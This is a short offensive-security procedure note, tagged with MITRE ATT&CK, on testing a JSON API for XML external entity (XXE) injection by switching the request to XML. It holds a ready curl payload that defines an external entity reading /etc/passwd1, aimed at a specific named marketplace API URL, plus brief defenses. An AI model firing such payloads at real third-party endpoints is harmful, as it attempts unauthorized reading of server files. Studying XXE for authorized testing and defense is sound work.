---
tags:
  - xxe
  - vulnerability-testing
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 3f0efbda-f3e1-4169-93ea-bef72befd754
created_at: '2025-12-13T09:00:27.553Z'
updated_at: '2025-12-13T09:00:27.553Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Change Content-Type and Test Basic XXE

## Summary

This procedure changes the request Content-Type to XML and injects a basic XXE payload to test for vulnerability by attempting to access a local file.

## Description

By switching to XML and including a DTD with an external entity referencing a system file, the procedure checks if the server parses XML entities. An error like JAXBException confirms the attempt, indicating XXE vulnerability. This is targeted at Java-based endpoints inferred from error messages.

## Requirements

1. Access to the API endpoint
2. Ability to modify HTTP headers and payloads
3. Knowledge of XML structure

## Defense

Defensive measures and detection strategies:

- Disable external entity resolution in XML parsers
- Monitor for XML Content-Type in requests to JSON endpoints

## Objectives

1. Confirm XML parsing
2. Test for basic file access via XXE
3. Identify vulnerability through errors

## Instructions

### Step 1: Modify Request to XML with XXE Payload

**Context**: Inject a simple XXE entity to attempt reading a non-existent file for error confirmation.

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd1"> ]><query>&xxe;</query>' https://marketplace.informatica.com/api/rest/mpapi/infaMPAPISearchWebService/query
```

> Expect a JAXBException error if the entity is processed.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[xxe]]
- [[vulnerability-testing]]
